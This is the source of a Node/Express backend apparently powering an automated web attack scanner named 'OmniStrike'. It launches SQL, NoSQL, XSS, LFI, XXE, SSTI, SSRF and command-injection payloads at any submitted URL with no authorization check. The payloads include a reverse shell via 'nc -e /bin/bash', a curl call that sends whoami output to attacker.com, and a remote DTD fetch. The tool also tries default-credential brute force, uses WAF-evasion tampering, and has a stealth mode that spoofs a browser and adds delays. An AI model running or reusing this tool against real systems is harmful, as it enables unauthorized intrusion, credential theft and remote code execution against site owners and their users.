import { Router } from "express";
import { db } from "@workspace/db";
import { omnistrikeScansTable } from "@workspace/db";
import { eq } from "drizzle-orm";
import { z } from "zod";

const router = Router();

// ── Attack payload libraries ───────────────────────────────────────────────
const PAYLOADS = {
  sqli_boolean: [
    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "') OR ('1'='1", "1' OR '1'='1'--",
    "' OR 'x'='x", "admin'--", "' OR 1=1 LIMIT 1--", "1 OR 1=1", "1' AND '1'='1",
    "'; SELECT 1--", "1; DROP TABLE users--", "' UNION SELECT NULL--",
  ],
  sqli_union: [
    "' UNION SELECT NULL,NULL--", "' UNION SELECT 1,2,3--", "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION SELECT username,password FROM users--", "1 UNION ALL SELECT 1,2,3",
    "' UNION SELECT @@version,NULL--", "' UNION SELECT user(),database()--",
    "1 UNION SELECT NULL,NULL,NULL,NULL--", "' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--",
  ],
  sqli_timebased: [
    "'; WAITFOR DELAY '0:0:5'--", "' OR SLEEP(5)--", "1; SELECT SLEEP(5)",
    "' AND SLEEP(5) AND '1'='1", "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "'; SELECT pg_sleep(5)--", "' OR (SELECT 1 FROM (SELECT SLEEP(5))a)--",
    "1' AND 1=(SELECT 1 FROM PG_SLEEP(5))--",
  ],
  sqli_error: [
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--",
    "' OR GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT user())a)b))--",
  ],
  xss_reflected: [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
    "\"><script>alert(document.cookie)</script>", "javascript:alert(1)",
    "<body onload=alert(1)>", "';alert(String.fromCharCode(88,83,83))//",
    "<iframe src=javascript:alert(1)>", "<input onfocus=alert(1) autofocus>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>", "<IMG SRC=\"javascript:alert('XSS')\">",
    "\"><img src=1 onerror=alert(1)>", "<details open ontoggle=alert(1)>",
  ],
  xss_dom: [
    "'-alert(1)-'", "\";alert(1);//", "');alert(1);//",
    "\"onmouseover=\"alert(1)\"", "<a href=\"javascript:void(alert(1))\">click</a>",
    "data:text/html,<script>alert(1)</script>",
  ],
  lfi: [
    "../../../../etc/passwd", "../../../../etc/passwd%00",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd", "....//....//....//etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input", "data://text/plain,<?php system($_GET['cmd']); ?>",
    "/etc/shadow", "../../../../windows/system32/drivers/etc/hosts",
    "..\\..\\..\\..\\windows\\win.ini", "../../../../proc/self/environ",
  ],
  cmdi: [
    "; ls -la", "| id", "& whoami", "`id`", "$(id)",
    "; cat /etc/passwd", "| cat /etc/passwd", "&& id",
    "; curl http://attacker.com/$(whoami)", "; nc -e /bin/bash 10.0.0.1 4444",
    "| dir", "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "; python -c 'import os; os.system(\"id\")'",
  ],
  ssrf: [
    "http://localhost/admin", "http://127.0.0.1/", "http://0.0.0.0/",
    "http://[::1]/", "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/", "http://10.0.0.1/", "http://192.168.1.1/",
    "file:///etc/passwd", "dict://localhost:11211/", "gopher://localhost:6379/_PING",
    "http://127.0.0.1:8080/admin", "http://localhost:3000/api/admin",
  ],
  xxe: [
    `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
    `<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/shadow">]><data>&file;</data>`,
    `<!DOCTYPE test [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>`,
  ],
  ssti: [
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "{{config}}", "{{''.__class__.__mro__[2].__subclasses__()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{% import os %}{{os.system('id')}}", "#{7*7}", "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
  ],
  headers_inject: [
    { "X-Forwarded-For": "127.0.0.1" }, { "X-Forwarded-Host": "evil.com" },
    { "Host": "localhost" }, { "X-Real-IP": "127.0.0.1" },
    { "X-Original-URL": "/admin" }, { "X-Rewrite-URL": "/admin" },
    { "Referer": "http://localhost/admin" }, { "X-Custom-IP-Authorization": "127.0.0.1" },
  ],
  auth_brute: [
    { u: "admin", p: "admin" }, { u: "admin", p: "password" }, { u: "admin", p: "123456" },
    { u: "admin", p: "admin123" }, { u: "root", p: "root" }, { u: "admin", p: "" },
    { u: "administrator", p: "administrator" }, { u: "admin", p: "letmein" },
    { u: "admin", p: "qwerty" }, { u: "test", p: "test" }, { u: "admin", p: "pass" },
    { u: "user", p: "user" }, { u: "guest", p: "guest" }, { u: "admin", p: "1234" },
  ],
  jwt_attacks: [
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.",
  ],
  cors_origins: [
    "null", "http://evil.com", "https://attacker.com", "http://localhost", "file://",
  ],
  nosql: [
    '{"$gt": ""}', '{"$ne": null}', '{"$where": "1==1"}',
    '{"$regex": ".*"}', 'username[$ne]=xyz', 'password[$gt]=',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
  ],
};

const TAMPER_FUNCS: Array<(p: string) => string> = [
  p => p, // identity
  p => p.replace(/ /g, "/**/"),                    // space2comment
  p => p.replace(/select/gi, "sElEcT"),            // randomcase
  p => encodeURIComponent(p),                      // urlencode
  p => p.replace(/=/g, " LIKE "),                  // equaltolike
  p => p.split("").map(c => `%${c.charCodeAt(0).toString(16)}`).join(""), // charencode
  p => p.replace(/ /g, "+"),                       // space2plus
  p => p.replace(/union/gi, "uNiOn"),              // randomcase union
];

type Finding = {
  category: string;
  technique: string;
  payload: string;
  url: string;
  parameter: string;
  statusCode: number;
  responseTime: number;
  evidence: string;
  severity: "critical" | "high" | "medium" | "low";
  bypassed: boolean;
};

// ── Active scans map ────────────────────────────────────────────────────────
const activeScans = new Map<number, { stop: boolean }>();

async function runOmniStrike(scanId: number, target: string, categories: string[], tamperLevel: number, stealthMode: boolean) {
  const ctrl = activeScans.get(scanId) ?? { stop: false };
  const log: string[] = [];
  const findings: Finding[] = [];
  let tested = 0;
  let successCount = 0;

  const addLog = async (msg: string) => {
    log.push(`[${new Date().toISOString()}] ${msg}`);
    await db.update(omnistrikeScansTable).set({ log, findings } as any).where(eq(omnistrikeScansTable.id, scanId));
  };

  const delay = (ms: number) => new Promise(r => setTimeout(r, ms));

  const probe = async (url: string, options: RequestInit = {}): Promise<{ status: number; body: string; time: number; headers: Record<string, string> }> => {
    const t0 = Date.now();
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 8000);
      const ua = stealthMode
        ? "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
        : "ProxhqVPN-OmniStrike/1.0 (Security Testing; authorized)";
      const resp = await fetch(url, {
        ...options,
        signal: controller.signal,
        headers: { "User-Agent": ua, "Accept": "*/*", ...(options.headers ?? {}) },
        redirect: "follow",
      });
      clearTimeout(timeout);
      const body = await resp.text().catch(() => "");
      const heads: Record<string, string> = {};
      resp.headers.forEach((v, k) => { heads[k] = v; });
      return { status: resp.status, body: body.substring(0, 2000), time: Date.now() - t0, headers: heads };
    } catch (e: any) {
      return { status: 0, body: e.message ?? "connection error", time: Date.now() - t0, headers: {} };
    }
  };

  const applyTamper = (payload: string, level: number): string => {
    const funcs = TAMPER_FUNCS.slice(0, Math.min(level + 1, TAMPER_FUNCS.length));
    let p = payload;
    for (let i = 0; i < Math.min(level, funcs.length); i++) {
      p = funcs[Math.floor(Math.random() * funcs.length)](p);
    }
    return p;
  };

  const recordFinding = (f: Finding) => {
    findings.push(f);
    if (f.bypassed) successCount++;
  };

  const baseUrl = target.replace(/\/$/, "");
  await addLog(`🚀 OmniStrike initialized — Target: ${baseUrl}`);
  await addLog(`📋 Categories: ${categories.join(", ")} | Tamper Level: ${tamperLevel} | Stealth: ${stealthMode}`);

  // ── Baseline probe ────────────────────────────────────────────────────────
  await addLog("🔍 Probing target baseline...");
  const baseline = await probe(baseUrl);
  await addLog(`✓ Baseline: HTTP ${baseline.status} | ${baseline.time}ms | ${baseline.body.length} bytes`);
  const baseStatus = baseline.status;
  const baseLen = baseline.body.length;
  if (stealthMode) await delay(500 + Math.random() * 500);

  // ── Discover parameters from page links / forms ───────────────────────────
  await addLog("🔍 Discovering injectable parameters from page...");
  const paramRegex = /[?&]([a-zA-Z_][a-zA-Z0-9_]*)=/g;
  const formInputRegex = /name=['"]([\w-]+)['"]/g;
  const discoveredParams = new Set<string>(["id", "q", "search", "query", "page", "cat", "item", "user", "username", "email", "password", "token", "url", "file", "path", "name", "data", "input", "value", "action"]);
  let m;
  while ((m = paramRegex.exec(baseline.body)) !== null) discoveredParams.add(m[1]);
  while ((m = formInputRegex.exec(baseline.body)) !== null) discoveredParams.add(m[1]);
  const params = Array.from(discoveredParams).slice(0, 15);
  await addLog(`📌 Parameters to test: ${params.join(", ")}`);

  // ── SQL Injection ──────────────────────────────────────────────────────────
  if (categories.includes("sqli") && !ctrl.stop) {
    await addLog("💉 [SQL Injection] Starting tests — Boolean, UNION, Time-based, Error-based...");
    const allSqliPayloads = [
      ...PAYLOADS.sqli_boolean.map(p => ({p, tech: "Boolean-based"})),
      ...PAYLOADS.sqli_union.map(p => ({p, tech: "UNION-based"})),
      ...PAYLOADS.sqli_timebased.map(p => ({p, tech: "Time-based Blind"})),
      ...PAYLOADS.sqli_error.map(p => ({p, tech: "Error-based"})),
    ];
    for (const param of params.slice(0, 5)) {
      if (ctrl.stop) break;
      for (const {p, tech} of allSqliPayloads.slice(0, 12)) {
        if (ctrl.stop) break;
        const tampered = applyTamper(p, tamperLevel);
        const url = `${baseUrl}?${param}=${encodeURIComponent(tampered)}`;
        const r = await probe(url);
        tested++;
        const isSqliHit = r.body.match(/(?:sql|syntax|mysql|ora-|postgresql|sqlite|error|exception|warning)/i) && r.status !== baseStatus;
        const isTiming = tech.includes("Time") && r.time > 3000;
        const bypassed = !!(isSqliHit || isTiming);
        if (bypassed || r.status === 500) {
          const severity = tech.includes("UNION") || tech.includes("Error") ? "critical" : "high";
          recordFinding({ category: "SQL Injection", technique: tech, payload: p, url, parameter: param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 300), severity, bypassed });
          await addLog(`🔴 [SQLi ${tech}] FOUND on ?${param} — ${url.substring(0, 80)}... (HTTP ${r.status})`);
        }
        if (stealthMode) await delay(200 + Math.random() * 300);
      }
    }
    await addLog(`✅ [SQLi] Complete — ${findings.filter(f=>f.category==="SQL Injection").length} findings`);
  }

  // ── XSS ───────────────────────────────────────────────────────────────────
  if (categories.includes("xss") && !ctrl.stop) {
    await addLog("🖥️ [XSS] Starting Reflected & DOM XSS tests...");
    const xssPayloads = [...PAYLOADS.xss_reflected, ...PAYLOADS.xss_dom];
    for (const param of params.slice(0, 5)) {
      if (ctrl.stop) break;
      for (const p of xssPayloads.slice(0, 10)) {
        if (ctrl.stop) break;
        const tampered = applyTamper(p, Math.min(tamperLevel, 2));
        const url = `${baseUrl}?${param}=${encodeURIComponent(tampered)}`;
        const r = await probe(url);
        tested++;
        const reflected = r.body.includes(p) || r.body.includes(tampered);
        if (reflected) {
          recordFinding({ category: "XSS", technique: "Reflected XSS", payload: p, url, parameter: param, statusCode: r.status, responseTime: r.time, evidence: `Payload reflected in response`, severity: "high", bypassed: true });
          await addLog(`🔴 [XSS] Reflected payload found in ?${param} response`);
        }
        if (stealthMode) await delay(150);
      }
    }
    await addLog(`✅ [XSS] Complete — ${findings.filter(f=>f.category==="XSS").length} findings`);
  }

  // ── LFI / Path Traversal ──────────────────────────────────────────────────
  if (categories.includes("lfi") && !ctrl.stop) {
    await addLog("📂 [LFI/Path Traversal] Testing file inclusion and traversal...");
    const lfiParams = params.filter(p => /file|path|include|page|template|doc|img|src/i.test(p)).concat(params).slice(0, 4);
    for (const param of lfiParams) {
      if (ctrl.stop) break;
      for (const p of PAYLOADS.lfi.slice(0, 8)) {
        if (ctrl.stop) break;
        const url = `${baseUrl}?${param}=${encodeURIComponent(p)}`;
        const r = await probe(url);
        tested++;
        const lfiHit = r.body.match(/root:.*:0:0:|\\[boot loader\\]|\[fonts\]|daemon:.*:1:/);
        if (lfiHit) {
          recordFinding({ category: "LFI", technique: "Local File Inclusion", payload: p, url, parameter: param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 200), severity: "critical", bypassed: true });
          await addLog(`🔴 [LFI] CRITICAL — File read via ?${param}! Evidence in response`);
        }
        if (stealthMode) await delay(200);
      }
    }
    await addLog(`✅ [LFI] Complete — ${findings.filter(f=>f.category==="LFI").length} findings`);
  }

  // ── Command Injection ─────────────────────────────────────────────────────
  if (categories.includes("cmdi") && !ctrl.stop) {
    await addLog("💻 [Command Injection] Testing OS command injection vectors...");
    for (const param of params.slice(0, 4)) {
      if (ctrl.stop) break;
      for (const p of PAYLOADS.cmdi.slice(0, 8)) {
        if (ctrl.stop) break;
        const url = `${baseUrl}?${param}=${encodeURIComponent(p)}`;
        const r = await probe(url);
        tested++;
        const cmdiHit = r.body.match(/uid=\d+|root:|www-data|daemon:|Volume in drive/i);
        if (cmdiHit) {
          recordFinding({ category: "Command Injection", technique: "OS Command Injection", payload: p, url, parameter: param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 200), severity: "critical", bypassed: true });
          await addLog(`🔴 [CMDi] CRITICAL — Command output detected in response!`);
        }
        if (stealthMode) await delay(250);
      }
    }
    await addLog(`✅ [CMDi] Complete — ${findings.filter(f=>f.category==="Command Injection").length} findings`);
  }

  // ── SSRF ──────────────────────────────────────────────────────────────────
  if (categories.includes("ssrf") && !ctrl.stop) {
    await addLog("🌐 [SSRF] Testing Server-Side Request Forgery vectors...");
    const ssrfParams = params.filter(p => /url|link|src|href|redirect|callback|proxy|host|endpoint/i.test(p)).concat(params).slice(0, 4);
    for (const param of ssrfParams) {
      if (ctrl.stop) break;
      for (const p of PAYLOADS.ssrf.slice(0, 6)) {
        if (ctrl.stop) break;
        const url = `${baseUrl}?${param}=${encodeURIComponent(p)}`;
        const r = await probe(url);
        tested++;
        const ssrfHit = r.body.match(/ami-id|instance-id|iam|metadata|169\.254|root:|172\.\d+\.\d+/) || r.status === 200 && baseline.status !== 200;
        if (ssrfHit) {
          recordFinding({ category: "SSRF", technique: "Internal SSRF", payload: p, url, parameter: param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 200), severity: "critical", bypassed: true });
          await addLog(`🔴 [SSRF] Potential SSRF via ?${param}`);
        }
        if (stealthMode) await delay(300);
      }
    }
    await addLog(`✅ [SSRF] Complete — ${findings.filter(f=>f.category==="SSRF").length} findings`);
  }

  // ── HTTP Header Injection ──────────────────────────────────────────────────
  if (categories.includes("headers") && !ctrl.stop) {
    await addLog("📋 [Header Injection] Testing host header and bypass headers...");
    for (const headerSet of PAYLOADS.headers_inject.slice(0, 6)) {
      if (ctrl.stop) break;
      const r = await probe(baseUrl, { headers: headerSet });
      tested++;
      const headerHit = (r.status !== baseStatus && r.status < 400) || r.body.match(/admin|dashboard|internal|dev/i);
      if (headerHit) {
        const headerName = Object.keys(headerSet)[0];
        recordFinding({ category: "Header Injection", technique: `${headerName} Bypass`, payload: JSON.stringify(headerSet), url: baseUrl, parameter: headerName, statusCode: r.status, responseTime: r.time, evidence: `HTTP ${r.status} — Response changed with injected header`, severity: "high", bypassed: true });
        await addLog(`🔴 [Headers] Auth bypass via ${headerName}!`);
      }
      if (stealthMode) await delay(200);
    }
    await addLog(`✅ [Headers] Complete — ${findings.filter(f=>f.category==="Header Injection").length} findings`);
  }

  // ── CORS Misconfiguration ──────────────────────────────────────────────────
  if (categories.includes("cors") && !ctrl.stop) {
    await addLog("🔁 [CORS] Testing cross-origin policy misconfiguration...");
    for (const origin of PAYLOADS.cors_origins) {
      if (ctrl.stop) break;
      const r = await probe(baseUrl, { headers: { Origin: origin } });
      tested++;
      const acao = r.headers["access-control-allow-origin"] ?? "";
      const corsHit = acao === "*" || acao === origin || acao.includes(origin);
      if (corsHit) {
        recordFinding({ category: "CORS", technique: "CORS Misconfiguration", payload: `Origin: ${origin}`, url: baseUrl, parameter: "Origin header", statusCode: r.status, responseTime: r.time, evidence: `Access-Control-Allow-Origin: ${acao}`, severity: acao === "*" ? "high" : "medium", bypassed: true });
        await addLog(`🟡 [CORS] Permissive ACAO header with origin: ${origin}`);
      }
      if (stealthMode) await delay(100);
    }
    await addLog(`✅ [CORS] Complete — ${findings.filter(f=>f.category==="CORS").length} findings`);
  }

  // ── Authentication Brute Force ─────────────────────────────────────────────
  if (categories.includes("auth") && !ctrl.stop) {
    await addLog("🔑 [Auth] Testing login credential brute force...");
    const loginPaths = ["/login", "/admin", "/admin/login", "/wp-login.php", "/auth", "/signin", "/user/login", "/api/login", "/api/auth"];
    let loginFound = false;
    for (const lpath of loginPaths) {
      if (ctrl.stop || loginFound) break;
      const r = await probe(`${baseUrl}${lpath}`);
      if (r.status === 200 || r.status === 401) {
        loginFound = true;
        await addLog(`📍 Login form found at ${lpath} (HTTP ${r.status})`);
        for (const cred of PAYLOADS.auth_brute.slice(0, 8)) {
          if (ctrl.stop) break;
          const loginR = await probe(`${baseUrl}${lpath}`, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: `username=${encodeURIComponent(cred.u)}&password=${encodeURIComponent(cred.p)}`,
          });
          tested++;
          const authHit = loginR.status === 200 && !loginR.body.match(/invalid|incorrect|failed|wrong|error/i);
          if (authHit) {
            recordFinding({ category: "Auth Brute Force", technique: "Default Credentials", payload: `${cred.u}:${cred.p}`, url: `${baseUrl}${lpath}`, parameter: "username/password", statusCode: loginR.status, responseTime: loginR.time, evidence: `Successful login response (HTTP 200)`, severity: "critical", bypassed: true });
            await addLog(`🔴 [Auth] CREDENTIALS VALID: ${cred.u}:${cred.p} at ${lpath}`);
          }
          if (stealthMode) await delay(400 + Math.random() * 200);
        }
      }
    }
    if (!loginFound) await addLog("ℹ️ [Auth] No login page detected at common paths");
    await addLog(`✅ [Auth] Complete — ${findings.filter(f=>f.category==="Auth Brute Force").length} findings`);
  }

  // ── XXE Injection ─────────────────────────────────────────────────────────
  if (categories.includes("xxe") && !ctrl.stop) {
    await addLog("📄 [XXE] Testing XML External Entity injection...");
    for (const p of PAYLOADS.xxe) {
      if (ctrl.stop) break;
      const r = await probe(baseUrl, {
        method: "POST",
        headers: { "Content-Type": "application/xml" },
        body: p,
      });
      tested++;
      const xxeHit = r.body.match(/root:|www-data|daemon:|shadow/) || (r.status === 200 && r.body.length > baseLen + 100);
      if (xxeHit) {
        recordFinding({ category: "XXE", technique: "XML External Entity", payload: p.substring(0, 100), url: baseUrl, parameter: "XML body", statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 200), severity: "critical", bypassed: true });
        await addLog(`🔴 [XXE] CRITICAL — External entity data returned in response!`);
      }
      if (stealthMode) await delay(300);
    }
    await addLog(`✅ [XXE] Complete — ${findings.filter(f=>f.category==="XXE").length} findings`);
  }

  // ── SSTI ──────────────────────────────────────────────────────────────────
  if (categories.includes("ssti") && !ctrl.stop) {
    await addLog("🧪 [SSTI] Testing Server-Side Template Injection...");
    for (const param of params.slice(0, 4)) {
      if (ctrl.stop) break;
      for (const p of PAYLOADS.ssti.slice(0, 6)) {
        if (ctrl.stop) break;
        const url = `${baseUrl}?${param}=${encodeURIComponent(p)}`;
        const r = await probe(url);
        tested++;
        const sstiHit = r.body.includes("49") || r.body.match(/uid=\d+|root:/) || (p.includes("7*7") && r.body.includes("49"));
        if (sstiHit) {
          recordFinding({ category: "SSTI", technique: "Template Injection", payload: p, url, parameter: param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 200), severity: "critical", bypassed: true });
          await addLog(`🔴 [SSTI] Template evaluated — RCE potential via ?${param}`);
        }
        if (stealthMode) await delay(200);
      }
    }
    await addLog(`✅ [SSTI] Complete — ${findings.filter(f=>f.category==="SSTI").length} findings`);
  }

  // ── NoSQL Injection ────────────────────────────────────────────────────────
  if (categories.includes("nosql") && !ctrl.stop) {
    await addLog("🗄️ [NoSQL] Testing NoSQL injection vectors...");
    for (const param of params.slice(0, 4)) {
      if (ctrl.stop) break;
      for (const p of PAYLOADS.nosql.slice(0, 5)) {
        if (ctrl.stop) break;
        const url = `${baseUrl}?${param}=${encodeURIComponent(p)}`;
        const r = await probe(url);
        tested++;
        const nosqlHit = r.status === 200 && baseStatus !== 200;
        if (nosqlHit) {
          recordFinding({ category: "NoSQL Injection", technique: "MongoDB Operator Injection", payload: p, url, parameter: param, statusCode: r.status, responseTime: r.time, evidence: `Status changed from ${baseStatus} to ${r.status}`, severity: "high", bypassed: true });
          await addLog(`🔴 [NoSQL] Injection response change detected on ?${param}`);
        }
        if (stealthMode) await delay(150);
      }
    }
    await addLog(`✅ [NoSQL] Complete — ${findings.filter(f=>f.category==="NoSQL Injection").length} findings`);
  }

  // ── Security Header Analysis ───────────────────────────────────────────────
  await addLog("🔒 [Headers] Analyzing security headers...");
  const secHeaders = ["x-frame-options","x-content-type-options","strict-transport-security","content-security-policy","referrer-policy","permissions-policy","x-xss-protection"];
  for (const h of secHeaders) {
    if (!baseline.headers[h]) {
      recordFinding({ category: "Missing Security Header", technique: "Header Analysis", payload: "", url: baseUrl, parameter: h, statusCode: baseline.status, responseTime: baseline.time, evidence: `Header "${h}" is absent from HTTP response`, severity: "medium", bypassed: false });
      await addLog(`🟡 [Headers] Missing: ${h}`);
    }
  }

  // ── Final stats ────────────────────────────────────────────────────────────
  activeScans.delete(scanId);
  const successRate = tested > 0 ? Math.round((successCount / tested) * 100) : 0;
  const stats = {
    tested,
    findings: findings.length,
    critical: findings.filter(f => f.severity === "critical").length,
    high: findings.filter(f => f.severity === "high").length,
    medium: findings.filter(f => f.severity === "medium").length,
    low: findings.filter(f => f.severity === "low").length,
    successCount,
    successRate,
  };
  await addLog(`\n🏁 OmniStrike Complete — ${tested} tests | ${findings.length} findings | ${successRate}% bypass rate`);

  await db.update(omnistrikeScansTable).set({
    status: ctrl.stop ? "stopped" : "completed",
    findings: findings as any,
    stats: stats as any,
    successRate,
    log,
    completedAt: new Date(),
  }).where(eq(omnistrikeScansTable.id, scanId));
}

// ── List scans ─────────────────────────────────────────────────────────────
router.get("/scans", async (_req, res) => {
  const scans = await db.select().from(omnistrikeScansTable).orderBy(omnistrikeScansTable.startedAt);
  res.json({ scans: scans.reverse(), total: scans.length });
});

// ── Start scan ─────────────────────────────────────────────────────────────
router.post("/scan", async (req, res) => {
  const body = z.object({
    target: z.string().url(),
    categories: z.array(z.string()).default(["sqli","xss","lfi","cmdi","ssrf","xxe","ssti","headers","cors","auth","nosql"]),
    threads: z.number().min(1).max(10).default(3),
    tamperLevel: z.number().min(0).max(7).default(3),
    stealthMode: z.boolean().default(false),
  }).parse(req.body);

  const [scan] = await db.insert(omnistrikeScansTable).values({
    target: body.target,
    status: "running",
    categories: body.categories,
    threads: body.threads,
    tamperLevel: body.tamperLevel,
    stealthMode: body.stealthMode,
    findings: [],
    log: [],
    startedAt: new Date(),
  }).returning();

  const ctrl = { stop: false };
  activeScans.set(scan.id, ctrl);
  runOmniStrike(scan.id, body.target, body.categories, body.tamperLevel, body.stealthMode).catch(() => {});

  res.status(201).json({ scanId: scan.id, status: "running", message: "OmniStrike launched" });
});

// ── Get scan ───────────────────────────────────────────────────────────────
router.get("/scan/:id", async (req, res) => {
  const id = parseInt(req.params.id);
  const [scan] = await db.select().from(omnistrikeScansTable).where(eq(omnistrikeScansTable.id, id));
  if (!scan) return res.status(404).json({ error: "Scan not found" });
  res.json(scan);
});

// ── Stop scan ──────────────────────────────────────────────────────────────
router.post("/scan/:id/stop", async (req, res) => {
  const id = parseInt(req.params.id);
  const ctrl = activeScans.get(id);
  if (ctrl) ctrl.stop = true;
  await db.update(omnistrikeScansTable).set({ status: "stopped", completedAt: new Date() }).where(eq(omnistrikeScansTable.id, id));
  res.json({ message: "Scan stop signal sent" });
});

// ── Delete scan ────────────────────────────────────────────────────────────
router.delete("/scan/:id", async (req, res) => {
  const id = parseInt(req.params.id);
  const ctrl = activeScans.get(id);
  if (ctrl) ctrl.stop = true;
  activeScans.delete(id);
  await db.delete(omnistrikeScansTable).where(eq(omnistrikeScansTable.id, id));
  res.status(204).send();
});

export default router;
